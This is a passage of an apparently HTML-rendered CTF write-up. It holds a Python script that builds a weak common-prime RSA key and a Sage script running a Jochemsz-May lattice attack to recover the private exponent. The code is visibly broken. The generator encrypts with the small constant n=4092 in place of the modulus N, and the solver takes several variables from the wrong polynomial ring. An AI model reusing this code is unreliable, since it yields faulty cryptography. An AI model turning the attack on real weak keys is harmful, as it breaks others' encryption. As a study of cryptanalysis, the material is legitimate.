class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">4092</span> </span><br><span class="line">gamma = <span class="number">0.4</span></span><br><span class="line">delta = <span class="number">0.1604</span></span><br><span class="line">flag = <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span> </span><br><span class="line"></span><br><span class="line">g = getPrime(<span class="built_in">int</span>(n*gamma)) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(n//<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%(<span class="number">2</span>*g) == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = getPrime(n//<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">if</span> (q-<span class="number">1</span>)%(<span class="number">2</span>*g) == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">a, b = (p-<span class="number">1</span>)//(<span class="number">2</span>*g), (q-<span class="number">1</span>)//(<span class="number">2</span>*g) </span><br><span class="line">N = p*q </span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n*delta)) </span><br><span class="line">e = inverse_mod(d, <span class="number">2</span>*g*a*b) </span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag) </span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="comment"># references: https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%03d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_monomials</span>(<span class="params">monomials</span>):</span><br><span class="line">    x, y, z = monomials[<span class="number">0</span>].parent().gens()</span><br><span class="line">    Mx = []</span><br><span class="line">    My = []</span><br><span class="line">    Mz = []</span><br><span class="line">    degx = <span class="built_in">max</span>([monomial.degree(x) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    degy = <span class="built_in">max</span>([monomial.degree(y) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    degz = <span class="built_in">max</span>([monomial.degree(z) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k+j &gt; i:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials:</span><br><span class="line">                    Mx += [mono]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> k &gt; j:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> Mx:</span><br><span class="line">                    My += [mono]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(degz + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(degy + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degx + <span class="number">1</span>):</span><br><span class="line">                mono = x^i * y^j * z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials <span class="keyword">and</span> mono <span class="keyword">not</span> <span class="keyword">in</span> (Mx+My):</span><br><span class="line">                    Mz += [mono]</span><br><span class="line">    <span class="keyword">return</span> Mx + My + Mz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jochemsz_may_trivariate</span>(<span class="params">pol, XX, YY, ZZ, WW, tau, mm</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Implementation of Finding roots of trivariate polynomial [1].</span></span><br><span class="line"><span class="string">    Thanks @Bono_iPad</span></span><br><span class="line"><span class="string">    References: </span></span><br><span class="line"><span class="string">        [1] Ellen Jochemsz and Alexander May. &quot;A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants&quot;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    tt = floor(mm * tau)</span><br><span class="line">    cond = XX^(<span class="number">7</span> + <span class="number">9</span>*tau + <span class="number">3</span>*tau^<span class="number">2</span>) * (YY*ZZ)^(<span class="number">5</span>+<span class="number">9</span>/<span class="number">2</span>*tau) &lt; WW^(<span class="number">3</span> + <span class="number">3</span>*tau)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Bound check: X^&#123;7+9tau+3tau^2&#125; * (YZ)^&#123;5+9/2tau&#125; &lt; W^&#123;3+3tau&#125;:&#x27;</span>, )</span><br><span class="line">    <span class="keyword">if</span> cond:</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;NG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Polynomial constant coefficient (a_0) must be 1</span></span><br><span class="line">    <span class="comment"># <span class="doctag">XXX:</span> can a_0 be zero?</span></span><br><span class="line">    f_ = pol</span><br><span class="line">    a0 = f_.constant_coefficient()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, XX) != <span class="number">1</span>:</span><br><span class="line">        XX += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, YY) != <span class="number">1</span>:</span><br><span class="line">        YY += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, ZZ) != <span class="number">1</span>:</span><br><span class="line">        ZZ += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a0, WW) != <span class="number">1</span>:</span><br><span class="line">        WW += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    RR = WW * XX^(<span class="number">2</span>*(mm-<span class="number">1</span>)+tt) * (YY*ZZ)^(mm-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> a0 != <span class="number">0</span>:</span><br><span class="line">        F = Zmod(RR)</span><br><span class="line">        PK = PolynomialRing(F, <span class="string">&#x27;xs, ys, zs&#x27;</span>)</span><br><span class="line">        f_ = PR(PK(f_) * F(a0)^-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct set `S` (cf.[1] p.8)</span></span><br><span class="line">    S = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, mm), repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>*(mm-<span class="number">1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            S.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    m_S = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*(mm-<span class="number">1</span>) - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">                m_S += [x^i*y^j*z^k]</span><br><span class="line">    S = m_S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct set `M` (cf.[1] p.8)</span></span><br><span class="line">    M = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i2, i3 <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, mm + <span class="number">1</span>), repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>*mm - (i2 + i3) + tt + <span class="number">1</span>):</span><br><span class="line">            M.add(x^i1 * y^i2 * z^i3)</span><br><span class="line">    M_S = <span class="built_in">list</span>(M - <span class="built_in">set</span>(S))</span><br><span class="line"></span><br><span class="line">    m_M_S = []</span><br><span class="line">    deg_x = <span class="built_in">max</span>([mono.degree(x) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_y = <span class="built_in">max</span>([mono.degree(y) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    deg_z = <span class="built_in">max</span>([mono.degree(z) <span class="keyword">for</span> mono <span class="keyword">in</span> M_S])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> M_S:</span><br><span class="line">                    m_M_S += [mono]</span><br><span class="line">    M_S = m_M_S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct polynomial `g`, `g&#x27;` for basis of lattice</span></span><br><span class="line">    g = []</span><br><span class="line">    g_ = []</span><br><span class="line">    M_S = sort_monomials(M_S)</span><br><span class="line">    S = sort_monomials(S)</span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> S:</span><br><span class="line">        i1 = monomial.degree(x)</span><br><span class="line">        i2 = monomial.degree(y)</span><br><span class="line">        i3 = monomial.degree(z)</span><br><span class="line">        g += [monomial * f_ * XX^(<span class="number">2</span>*(mm-<span class="number">1</span>)+tt-i1) * YY^(mm-<span class="number">1</span>-i2) * ZZ^(mm-<span class="number">1</span>-i3)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> monomial <span class="keyword">in</span> M_S:</span><br><span class="line">        g_ += [monomial * RR]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct Lattice from `g`, `g&#x27;`</span></span><br><span class="line">    monomials_G = []</span><br><span class="line">    monomials = []</span><br><span class="line">    G = g + g_</span><br><span class="line">    deg_x = deg_y = deg_z = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g_poly <span class="keyword">in</span> G:</span><br><span class="line">        monomials_G += g_poly.monomials()</span><br><span class="line">        deg_x = <span class="built_in">max</span>(deg_x, g_poly.degree(x))</span><br><span class="line">        deg_y = <span class="built_in">max</span>(deg_y, g_poly.degree(y))</span><br><span class="line">        deg_z = <span class="built_in">max</span>(deg_z, g_poly.degree(z))</span><br><span class="line">    monomials_G = <span class="built_in">sorted</span>(<span class="built_in">set</span>(monomials_G))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(deg_z + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(deg_y + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(deg_x + <span class="number">1</span>):</span><br><span class="line">                mono = x^i*y^j*z^k</span><br><span class="line">                <span class="keyword">if</span> mono <span class="keyword">in</span> monomials_G:</span><br><span class="line">                    monomials += [x^i*y^j*z^k]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(monomials) == <span class="built_in">len</span>(G)</span><br><span class="line">    monomials = sort_monomials(monomials)</span><br><span class="line">    dims = <span class="built_in">len</span>(monomials)</span><br><span class="line">    M = Matrix(IntegerRing(), dims)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">        M[i, <span class="number">0</span>] = G[i](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">            <span class="keyword">if</span> monomials[j] <span class="keyword">in</span> G[i].monomials():</span><br><span class="line">                M[i, j] = G[i].monomial_coefficient(monomials[j]) * monomials[j](XX, YY, ZZ)</span><br><span class="line">    matrix_overview(M)</span><br><span class="line">    <span class="built_in">print</span> ()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;=&#x27;</span> * <span class="number">128</span>)</span><br><span class="line">    <span class="built_in">print</span> ()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line"></span><br><span class="line">    start = time()</span><br><span class="line">    B = M.LLL()</span><br><span class="line">    matrix_overview(B)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] LLL cost %d sec&#x27;</span> % (time() - start))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Re-construct polynomial `H_i` from Reduced-lattice</span></span><br><span class="line">    H = [(i, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims)]</span><br><span class="line">    H = <span class="built_in">dict</span>(H)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dims):</span><br><span class="line">            H[i] += PR((monomials[j] * B[i, j]) / monomials[j](XX, YY, ZZ))</span><br><span class="line"></span><br><span class="line">    PX = PolynomialRing(IntegerRing(), <span class="string">&#x27;xn&#x27;</span>)</span><br><span class="line">    xn = PX.gen()</span><br><span class="line">    PY = PolynomialRing(IntegerRing(), <span class="string">&#x27;yn&#x27;</span>)</span><br><span class="line">    yn = PX.gen()</span><br><span class="line">    PZ = PolynomialRing(IntegerRing(), <span class="string">&#x27;zn&#x27;</span>)</span><br><span class="line">    zn = PX.gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `x`</span></span><br><span class="line">    r1 = H[<span class="number">2</span>].resultant(pol, y)</span><br><span class="line">    r2 = H[<span class="number">3</span>].resultant(pol, y)</span><br><span class="line">    r3 = r1.resultant(r2, z)</span><br><span class="line">    x_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], r3.subs(x=xn).roots())</span><br><span class="line">    x_roots = <span class="built_in">list</span>(x_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x_roots) == <span class="number">1</span> <span class="keyword">and</span> x_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `x`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    x_root = x_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Found x0 = %d&#x27;</span> % x_root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `z`</span></span><br><span class="line">    r1_ = r1.subs(x=x_root)</span><br><span class="line">    r2_ = r2.subs(x=x_root)</span><br><span class="line">    z_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], gcd(r1_, r2_).subs(z=zn).roots())</span><br><span class="line">    z_roots = <span class="built_in">list</span>(z_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(z_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(z_roots) == <span class="number">1</span> <span class="keyword">and</span> z_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `z`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    z_root = z_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Found z0 = %d&#x27;</span> % z_root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `y`</span></span><br><span class="line">    y_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], H[<span class="number">2</span>].subs(x=x_root, z=z_root).subs(y=yn).roots())</span><br><span class="line">    y_roots = <span class="built_in">list</span>(y_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(y_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(y_roots) == <span class="number">1</span> <span class="keyword">and</span> y_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `y`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    y_root = y_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Found y0 = %d&#x27;</span> % y_root)</span><br><span class="line">    <span class="keyword">assert</span> pol(x_root, y_root, z_root) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> (x_root, y_root, z_root)</span><br><span class="line"></span><br><span class="line">n = <span class="number">58088432169707511884530887899705328460043341752051203523596713643978064163990486003388043207708974302843002172264417411586749486956628013574926573715095249317804208372132481594468281365459316852927039797580064466731086129431102303726096683810636192790138689214881951836298576801818592777778548978736174404573637727968467102304994883348510912250960513170991711142297420921866513951251779528983034404550484931629702384165892697556071097115581299228167852394258387798734409094231193145682416393190929132395057494573898497863918989076392413537702062176268786330410635086565380004463707094857932051066439903977555824218219175469965671350998705376046031482320586719742092257095632485346554447599297796154806971819544073874759609887168714861438380508381072200369356855424637087904990126639040356052220595703217836390163784968964557550834138598331720685971193948909145336792118311346853933919997080542485529346554810899612986872128053464963893904969598870571593590391792680177336466285483108769678524923709955832516312592396932275858180384073997491565078915852990631405792518132787289319255490058314797418779789436482247156880548274241414788581503832731423362447015575598719157544932430682335826661205441977262084135022109705809490179219483</span></span><br><span class="line">e = <span class="number">1296863142627338816011174237898978985407338763709131570002553514972553044428195580769854555546152719732990573444787592853632636242677007643888487629752955065888264014132275294946697123213980215879592216819850992977582758776020797257958443371755687921634978634111557036569863976062810460472490135115734285081745257140890782551910267112228842110620084653440977034007333330590567591507504424149155838966172077983891168269103390479149309815192817914537419492632845858394205854892694802909512194639800529863998537677351955149803841057222279150345376221210193853988829004456607875070080035867353641697190133291884195010172677474092272163240020759433657106746641878734177642792083528380007586872967990567342937466301144028345682953828338178443155</span></span><br><span class="line">c = <span class="number">16752688445992597693492078768792988158064245788490841004088700531099790536110447985923645388328978598918558573058666020752484085376750645920339841721965079433955597051770967985244844142502867651653937397609501854590348737333886080652220527816829409949342731486933197221896957534095862738894180358847113397085352739280484473781105412902120746843518141064227815586490173586590816604826188741474912189470710829803523377024132104491423108113497334941368230382051634727609001152617358942201879845045218836779639253498499815164099738639536103677828973445421741990132435162229847121113067305553125456102367833209883862574433343054494403402942865858273752590543256912451674260568595630772845863280356673914311032101592460580258363122918410617942433477032366206849438716812374524146273199242870667580346229125800066983929229036090475897273116326252901163310893757592468684517304717063925001322227024645779923535448521921111520336345056548259711472788891467777369226660588848284132193326948102214348764076553879941966538872384437359308388683625433227236271678080771257212907044825226381230194582232438875515978892368369803853787442589487796945615448231745137876193113566019341508962555358522784268738179046402147785632513268769395719591200620</span></span><br><span class="line"></span><br><span class="line">gamma = <span class="number">0.4</span></span><br><span class="line">delta = <span class="number">0.1604</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x, y, z&gt; = PolynomialRing(ZZ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Maximal value of solution `x0`, `y0`, `z0`</span></span><br><span class="line">XX = floor(n^delta)</span><br><span class="line">YY = floor(n^(delta + <span class="number">0.5</span> - gamma))</span><br><span class="line">ZZ = YY</span><br><span class="line"></span><br><span class="line"><span class="comment"># Norm of polynomial as vector representation</span></span><br><span class="line">WW = floor(n^(<span class="number">2</span> + <span class="number">2</span>*delta - <span class="number">2</span>*gamma))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some Non-negative real ([SAN10] 3.1 (11))</span></span><br><span class="line">tau = (<span class="number">1</span>/<span class="number">2</span> + gamma - <span class="number">4</span>*delta) / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powering degree</span></span><br><span class="line">mm = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Target polynomial</span></span><br><span class="line">pol = e^<span class="number">2</span> * x^<span class="number">2</span> + e*x*(y+z-<span class="number">2</span>)-(y+z-<span class="number">1</span>)-(n-<span class="number">1</span>)*y*z</span><br><span class="line">x0, y0, z0 = jochemsz_may_trivariate(pol, XX, YY, ZZ, WW, tau, mm)</span><br><span class="line"></span><br><span 